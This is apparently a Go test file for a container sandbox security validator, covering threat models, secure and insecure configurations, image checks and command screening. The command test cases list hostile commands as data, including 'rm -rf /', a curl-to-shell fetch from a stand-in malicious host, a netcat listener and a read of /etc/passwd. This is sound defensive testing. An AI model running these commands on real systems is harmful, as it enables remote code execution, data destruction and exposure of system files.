package utils

import (
	"context"
	"os"
	"testing"
	"time"

	"github.com/rs/zerolog"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestSecurityValidator(t *testing.T) {
	logger := zerolog.New(zerolog.NewTestWriter(t)).With().Timestamp().Logger()
	validator := NewSecurityValidator(logger)

	t.Run("Initialization", func(t *testing.T) {
		assert.NotNil(t, validator)
		assert.NotNil(t, validator.threatModel)
		assert.NotNil(t, validator.policyEngine)
		assert.NotEmpty(t, validator.threatModel.Threats)
		assert.NotEmpty(t, validator.threatModel.Controls)
	})

	t.Run("ThreatModelValidation", func(t *testing.T) {
		// Verify all threats have valid mitigations
		for threatID, threat := range validator.threatModel.Threats {
			assert.NotEmpty(t, threat.ID, "Threat %s missing ID", threatID)
			assert.NotEmpty(t, threat.Name, "Threat %s missing name", threatID)
			assert.NotEmpty(t, threat.Impact, "Threat %s missing impact", threatID)
			assert.NotEmpty(t, threat.Probability, "Threat %s missing probability", threatID)
			assert.NotEmpty(t, threat.Mitigations, "Threat %s missing mitigations", threatID)

			// Verify all mitigations exist as controls
			for _, controlID := range threat.Mitigations {
				_, exists := validator.threatModel.Controls[controlID]
				assert.True(t, exists, "Control %s referenced by threat %s does not exist", controlID, threatID)
			}
		}

		// Verify all controls are properly defined
		for controlID, control := range validator.threatModel.Controls {
			assert.NotEmpty(t, control.ID, "Control %s missing ID", controlID)
			assert.NotEmpty(t, control.Name, "Control %s missing name", controlID)
			assert.NotEmpty(t, control.Type, "Control %s missing type", controlID)
			assert.NotEmpty(t, control.Effectiveness, "Control %s missing effectiveness", controlID)
			assert.Contains(t, []string{"PREVENTIVE", "DETECTIVE", "CORRECTIVE"}, control.Type)
			assert.Contains(t, []string{"HIGH", "MEDIUM", "LOW"}, control.Effectiveness)
		}
	})

	t.Run("SecurityValidation_SecureConfiguration", func(t *testing.T) {
		ctx := context.Background()
		sessionID := "test-secure-session"

		// Configure secure options
		options := AdvancedSandboxOptions{
			SandboxOptions: SandboxOptions{
				BaseImage:     "alpine:3.18",
				MemoryLimit:   256 * 1024 * 1024,
				CPUQuota:      50000,
				Timeout:       30 * time.Second,
				ReadOnly:      true,
				NetworkAccess: false,
				SecurityPolicy: SecurityPolicy{
					AllowNetworking:   false,
					AllowFileSystem:   true,
					RequireNonRoot:    true,
					TrustedRegistries: []string{"docker.io"},
				},
			},
			User:         "1000",
			Group:        "1000",
			Capabilities: []string{}, // No capabilities
		}

		report, err := validator.ValidateSecurity(ctx, sessionID, options)
		assert.NoError(t, err)
		assert.NotNil(t, report)
		assert.True(t, report.Passed, "Secure configuration should pass validation")
		assert.Contains(t, []string{"LOW", "MEDIUM"}, report.OverallRisk)
		assert.LessOrEqual(t, len(report.Vulnerabilities), 1) // Only 'latest' tag issue

		// Verify threat assessments
		for threatID, assessment := range report.ThreatAssessment {
			if threatID == "T001" || threatID == "T004" { // Container escape, privilege escalation
				assert.True(t, assessment.Mitigated, "Critical threats should be mitigated")
				assert.Contains(t, []string{"LOW", "MEDIUM"}, assessment.RiskLevel)
			}
		}

		// Verify control assessments
		for controlID, assessment := range report.ControlStatus {
			switch controlID {
			case "C001": // Non-root user
				assert.True(t, assessment.Effective, "Non-root user control should be effective")
				assert.Equal(t, 1.0, assessment.Coverage)
			case "C002": // Read-only filesystem
				assert.True(t, assessment.Effective, "Read-only filesystem control should be effective")
				assert.Equal(t, 1.0, assessment.Coverage)
			case "C003": // Network isolation
				assert.True(t, assessment.Effective, "Network isolation control should be effective")
				assert.Equal(t, 1.0, assessment.Coverage)
			case "C007": // Resource limits
				assert.True(t, assessment.Effective, "Resource limits control should be effective")
				assert.Equal(t, 1.0, assessment.Coverage)
			case "C009": // Capability dropping
				assert.True(t, assessment.Effective, "Capability dropping control should be effective")
				assert.Equal(t, 1.0, assessment.Coverage)
			}
		}
	})

	t.Run("SecurityValidation_InsecureConfiguration", func(t *testing.T) {
		ctx := context.Background()
		sessionID := "test-insecure-session"

		// Configure insecure options
		options := AdvancedSandboxOptions{
			SandboxOptions: SandboxOptions{
				BaseImage:     "ubuntu:latest", // Using latest tag
				MemoryLimit:   0,               // No memory limit
				CPUQuota:      0,               // No CPU limit
				Timeout:       0,               // No timeout
				ReadOnly:      false,           // Writable filesystem
				NetworkAccess: true,            // Network enabled
			},
			User:         "root", // Running as root
			Group:        "root",
			Capabilities: []string{"SYS_ADMIN", "NET_ADMIN"}, // Dangerous capabilities
		}

		report, err := validator.ValidateSecurity(ctx, sessionID, options)
		assert.NoError(t, err)
		assert.NotNil(t, report)
		assert.False(t, report.Passed, "Insecure configuration should fail validation")
		assert.Contains(t, []string{"HIGH", "CRITICAL"}, report.OverallRisk)
		assert.Greater(t, len(report.Vulnerabilities), 3) // Multiple issues

		// Should have vulnerabilities for root user, dangerous capabilities, network access
		vulnTypes := make(map[string]bool)
		for _, vuln := range report.Vulnerabilities {
			vulnTypes[vuln.CVE] = true
		}
		assert.True(t, vulnTypes["MISC-001"], "Should detect root user vulnerability")
		assert.True(t, vulnTypes["MISC-002"], "Should detect network access vulnerability")
		assert.True(t, vulnTypes["MISC-003"], "Should detect latest tag vulnerability")
		assert.True(t, vulnTypes["MISC-CAP-SYS_ADMIN"], "Should detect dangerous capability")

		// Should have many recommendations
		assert.Greater(t, len(report.Recommendations), 3)
		highPriorityRecs := 0
		for _, rec := range report.Recommendations {
			if rec.Priority == "HIGH" {
				highPriorityRecs++
			}
		}
		assert.Greater(t, highPriorityRecs, 2, "Should have multiple high priority recommendations")
	})

	t.Run("ImageSecurityValidation", func(t *testing.T) {
		ctx := context.Background()

		testCases := []struct {
			name           string
			image          string
			expectedPassed bool
			expectedVulns  int
		}{
			{
				name:           "Trusted image with version",
				image:          "alpine:3.18",
				expectedPassed: true,
				expectedVulns:  0,
			},
			{
				name:           "Trusted image with latest",
				image:          "ubuntu:latest",
				expectedPassed: true,
				expectedVulns:  1, // Latest tag warning
			},
			{
				name:           "Untrusted registry",
				image:          "malicious.registry.com/evil:latest",
				expectedPassed: true, // Low/medium risk still passes
				expectedVulns:  2,    // Untrusted registry + latest tag
			},
			{
				name:           "Library image",
				image:          "nginx",
				expectedPassed: true,
				expectedVulns:  1, // Latest tag implied
			},
		}

		for _, tc := range testCases {
			t.Run(tc.name, func(t *testing.T) {
				report, err := validator.ValidateImageSecurity(ctx, tc.image)
				assert.NoError(t, err)
				assert.NotNil(t, report)
				assert.Equal(t, tc.expectedPassed, report.Passed)
				assert.Len(t, report.Vulnerabilities, tc.expectedVulns)
			})
		}
	})

	t.Run("CommandSecurityValidation", func(t *testing.T) {
		testCases := []struct {
			name           string
			cmd            []string
			expectedPassed bool
			expectedVulns  int
		}{
			{
				name:           "Safe command",
				cmd:            []string{"echo", "hello world"},
				expectedPassed: true,
				expectedVulns:  0,
			},
			{
				name:           "List files",
				cmd:            []string{"ls", "-la"},
				expectedPassed: true,
				expectedVulns:  0,
			},
			{
				name:           "Destructive command",
				cmd:            []string{"rm", "-rf", "/"},
				expectedPassed: false,
				expectedVulns:  1,
			},
			{
				name:           "Privilege escalation",
				cmd:            []string{"sudo", "apt", "install", "malware"},
				expectedPassed: false,
				expectedVulns:  1,
			},
			{
				name:           "Remote code execution",
				cmd:            []string{"curl", "http://malicious.com/script.sh", "|", "sh"},
				expectedPassed: false,
				expectedVulns:  1,
			},
			{
				name:           "Network listener",
				cmd:            []string{"nc", "-l", "4444"},
				expectedPassed: true, // Medium risk still passes
				expectedVulns:  1,
			},
			{
				name:           "Command substitution",
				cmd:            []string{"echo", "$(cat /etc/passwd)"},
				expectedPassed: true, // Medium risk still passes
				expectedVulns:  1,
			},
		}

		for _, tc := range testCases {
			t.Run(tc.name, func(t *testing.T) {
				report, err := validator.ValidateCommandSecurity(tc.cmd)
				assert.NoError(t, err)
				assert.NotNil(t, report)
				assert.Equal(t, tc.expectedPassed, report.Passed)
				assert.Len(t, report.Vulnerabilities, tc.expectedVulns)
			})
		}
	})

	t.Run("RiskCalculation", func(t *testing.T) {
		testCases := []struct {
			name              string
			impact            string
			probability       string
			mitigated         bool
			expectedRiskLevel string
		}{
			{
				name:              "High impact, high probability, not mitigated",
				impact:            "HIGH",
				probability:       "HIGH",
				mitigated:         false,
				expectedRiskLevel: "CRITICAL",
			},
			{
				name:              "High impact, high probability, mitigated",
				impact:            "HIGH",
				probability:       "HIGH",
				mitigated:         true,
				expectedRiskLevel: "LOW", // 9.0 * 0.3 = 2.7
			},
			{
				name:              "Medium impact, medium probability, not mitigated",
				impact:            "MEDIUM",
				probability:       "MEDIUM",
				mitigated:         false,
				expectedRiskLevel: "MEDIUM", // 2.0 * 2.0 = 4.0
			},
			{
				name:              "Low impact, low probability, not mitigated",
				impact:            "LOW",
				probability:       "LOW",
				mitigated:         false,
				expectedRiskLevel: "LOW", // 1.0 * 1.0 = 1.0
			},
		}

		for _, tc := range testCases {
			t.Run(tc.name, func(t *testing.T) {
				threat := ThreatInfo{
					Impact:      tc.impact,
					Probability: tc.probability,
				}
				riskScore := validator.calculateThreatRiskScore(threat, tc.mitigated)
				riskLevel := validator.getRiskLevel(riskScore)
				assert.Equal(t, tc.expectedRiskLevel, riskLevel)
			})
		}
	})

	t.Run("ComplianceAssessment", func(t *testing.T) {
		compliance := validator.assessCompliance()
		assert.NotNil(t, compliance)
		assert.Contains(t, compliance.Standards, "CIS_Docker")
		assert.Contains(t, compliance.Standards, "NIST_SP800-190")

		cisCompliance := compliance.Standards["CIS_Docker"]
		assert.NotEmpty(t, cisCompliance.Standard)
		assert.NotEmpty(t, cisCompliance.Version)
		assert.NotEmpty(t, cisCompliance.Controls)

		nistCompliance := compliance.Standards["NIST_SP800-190"]
		assert.NotEmpty(t, nistCompliance.Standard)
		assert.NotEmpty(t, nistCompliance.Version)
		assert.NotEmpty(t, nistCompliance.Controls)
	})

	t.Run("SecurityReportGeneration", func(t *testing.T) {
		ctx := context.Background()
		sessionID := "test-report-session"

		// Create a mixed security scenario
		options := AdvancedSandboxOptions{
			SandboxOptions: SandboxOptions{
				BaseImage:     "ubuntu:latest",
				MemoryLimit:   512 * 1024 * 1024,
				CPUQuota:      75000,
				ReadOnly:      true,
				NetworkAccess: false,
			},
			User:  "1000",
			Group: "1000",
		}

		report, err := validator.ValidateSecurity(ctx, sessionID, options)
		require.NoError(t, err)

		textReport := validator.GenerateSecurityReport(report)
		assert.NotEmpty(t, textReport)
		assert.Contains(t, textReport, "SECURITY VALIDATION REPORT")
		assert.Contains(t, textReport, "VULNERABILITY ANALYSIS")
		assert.Contains(t, textReport, "THREAT ASSESSMENT")
		assert.Contains(t, textReport, "SECURITY CONTROLS")
		assert.Contains(t, textReport, "COMPLIANCE STATUS")

		// Check for specific content based on configuration
		if report.OverallRisk == "LOW" {
			assert.Contains(t, textReport, "✅ PASSED")
		} else {
			assert.Contains(t, textReport, "❌ FAILED")
		}
	})

	t.Run("ReportSaving", func(t *testing.T) {
		ctx := context.Background()
		sessionID := "test-save-session"
		tempDir := t.TempDir()

		options := AdvancedSandboxOptions{
			SandboxOptions: SandboxOptions{
				BaseImage: "alpine:3.18",
			},
			User:  "1000",
			Group: "1000",
		}

		report, err := validator.ValidateSecurity(ctx, sessionID, options)
		require.NoError(t, err)

		filename := tempDir + "/security_report"
		err = validator.SaveSecurityReport(report, filename)
		assert.NoError(t, err)

		// Verify files were created
		_, err = os.Stat(filename + ".json")
		assert.NoError(t, err, "JSON report should be created")

		_, err = os.Stat(filename + ".txt")
		assert.NoError(t, err, "Text report should be created")
	})
}

func TestThreatModel(t *testing.T) {
	threatModel := NewThreatModel()

	t.Run("ThreatDefinitions", func(t *testing.T) {
		requiredThreats := []string{"T001", "T002", "T003", "T004", "T005"}
		for _, threatID := range requiredThreats {
			threat, exists := threatModel.Threats[threatID]
			assert.True(t, exists, "Threat %s should exist", threatID)
			assert.NotEmpty(t, threat.Name)
			assert.NotEmpty(t, threat.Description)
			assert.Contains(t, []string{"HIGH", "MEDIUM", "LOW"}, threat.Impact)
			assert.Contains(t, []string{"HIGH", "MEDIUM", "LOW"}, threat.Probability)
			assert.NotEmpty(t, threat.Category)
			assert.NotEmpty(t, threat.Mitigations)
		}
	})

	t.Run("ControlDefinitions", func(t *testing.T) {
		requiredControls := []string{"C001", "C002", "C003", "C007", "C009"}
		for _, controlID := range requiredControls {
			control, exists := threatModel.Controls[controlID]
			assert.True(t, exists, "Control %s should exist", controlID)
			assert.NotEmpty(t, control.Name)
			assert.NotEmpty(t, control.Description)
			assert.Contains(t, []string{"PREVENTIVE", "DETECTIVE", "CORRECTIVE"}, control.Type)
			assert.Contains(t, []string{"HIGH", "MEDIUM", "LOW"}, control.Effectiveness)
			assert.NotEmpty(t, control.Threats)
		}
	})

	t.Run("ThreatControlMapping", func(t *testing.T) {
		// Verify that all threats are covered by at least one control
		for threatID, threat := range threatModel.Threats {
			for _, controlID := range threat.Mitigations {
				control, exists := threatModel.Controls[controlID]
				assert.True(t, exists, "Control %s should exist for threat %s", controlID, threatID)
				assert.Contains(t, control.Threats, threatID, "Control %s should list threat %s", controlID, threatID)
			}
		}

		// Verify that all controls address at least one threat
		for controlID, control := range threatModel.Controls {
			assert.NotEmpty(t, control.Threats, "Control %s should address at least one threat", controlID)
			for _, threatID := range control.Threats {
				threat, exists := threatModel.Threats[threatID]
				assert.True(t, exists, "Threat %s should exist for control %s", threatID, controlID)
				assert.Contains(t, threat.Mitigations, controlID, "Threat %s should list control %s", threatID, controlID)
			}
		}
	})
}

func TestSecurityValidatorIntegration(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping integration test in short mode")
	}

	logger := zerolog.New(zerolog.NewTestWriter(t)).With().Timestamp().Logger()
	validator := NewSecurityValidator(logger)
	ctx := context.Background()

	t.Run("EndToEndSecurityValidation", func(t *testing.T) {
		// Test realistic scenarios
		scenarios := []struct {
			name     string
			options  AdvancedSandboxOptions
			expected struct {
				passed   bool
				risk     string
				minVulns int
				maxVulns int
			}
		}{
			{
				name: "Production Ready Configuration",
				options: AdvancedSandboxOptions{
					SandboxOptions: SandboxOptions{
						BaseImage:     "alpine:3.18",
						MemoryLimit:   256 * 1024 * 1024,
						CPUQuota:      50000,
						ReadOnly:      true,
						NetworkAccess: false,
						Timeout:       30 * time.Second,
					},
					User:         "1000",
					Group:        "1000",
					Capabilities: []string{},
				},
				expected: struct {
					passed   bool
					risk     string
					minVulns int
					maxVulns int
				}{true, "LOW", 0, 0},
			},
			{
				name: "Development Configuration",
				options: AdvancedSandboxOptions{
					SandboxOptions: SandboxOptions{
						BaseImage:     "ubuntu:latest",
						MemoryLimit:   512 * 1024 * 1024,
						CPUQuota:      75000,
						ReadOnly:      false,
						NetworkAccess: true,
					},
					User:         "1000",
					Group:        "1000",
					Capabilities: []string{"NET_BIND_SERVICE"},
				},
				expected: struct {
					passed   bool
					risk     string
					minVulns int
					maxVulns int
				}{false, "HIGH", 2, 3},
			},
			{
				name: "Dangerous Configuration",
				options: AdvancedSandboxOptions{
					SandboxOptions: SandboxOptions{
						BaseImage:     "ubuntu:latest",
						ReadOnly:      false,
						NetworkAccess: true,
					},
					User:         "root",
					Group:        "root",
					Capabilities: []string{"SYS_ADMIN", "NET_ADMIN"},
				},
				expected: struct {
					passed   bool
					risk     string
					minVulns int
					maxVulns int
				}{false, "HIGH", 4, 6},
			},
		}

		for _, scenario := range scenarios {
			t.Run(scenario.name, func(t *testing.T) {
				report, err := validator.ValidateSecurity(ctx, "test-session", scenario.options)
				assert.NoError(t, err)
				assert.Equal(t, scenario.expected.passed, report.Passed)
				assert.Equal(t, scenario.expected.risk, report.OverallRisk)
				assert.GreaterOrEqual(t, len(report.Vulnerabilities), scenario.expected.minVulns)
				assert.LessOrEqual(t, len(report.Vulnerabilities), scenario.expected.maxVulns)
			})
		}
	})
}

func BenchmarkSecurityValidation(b *testing.B) {
	logger := zerolog.Nop()
	validator := NewSecurityValidator(logger)
	ctx := context.Background()

	options := AdvancedSandboxOptions{
		SandboxOptions: SandboxOptions{
			BaseImage:     "alpine:3.18",
			MemoryLimit:   256 * 1024 * 1024,
			CPUQuota:      50000,
			ReadOnly:      true,
			NetworkAccess: false,
		},
		User:  "1000",
		Group: "1000",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, err := validator.ValidateSecurity(ctx, "bench-session", options)
		if err != nil {
			b.Fatal(err)
		}
	}
}
